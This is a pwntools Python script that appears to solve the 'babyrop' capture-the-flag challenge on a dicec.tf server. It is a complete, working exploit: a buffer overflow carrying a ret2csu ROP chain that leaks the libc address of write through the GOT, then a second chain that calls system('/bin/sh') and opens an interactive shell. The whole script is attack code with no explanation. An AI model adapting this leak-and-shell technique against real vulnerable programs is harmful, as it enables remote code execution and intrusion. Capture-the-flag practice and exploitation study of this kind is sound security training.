#!/usr/bin/env python3

from pwn import *

exe = ELF("../babyrop")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

host = args.HOST or "dicec.tf"
port = args.PORT or 31924

def local():
  return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
'''

r = conn()

# good luck pwning :)

csu_1 = 0x4011ca
csu_2 = 0x4011b0

rop = b'A'*72
rop += p64(csu_1)
rop += p64(0)
rop += p64(1)
rop += p64(1)
rop += p64(exe.got['write'])
rop += p64(8)
rop += p64(exe.got['write'])
rop += p64(csu_2)
rop += p64(0)*7
rop += p64(exe.sym['main'])
r.sendlineafter('Your name: ', rop)

libc.address = u64(r.recv(8)) - libc.sym['write']
log.info(hex(libc.address))

rop = b'A'*72
rop += p64(csu_1+9)
rop += p64(next(libc.search(b'/bin/sh\x00')))
rop += p64(csu_1+10)
rop += p64(libc.sym['system'])
r.sendlineafter('Your name: ', rop)

r.interactive()
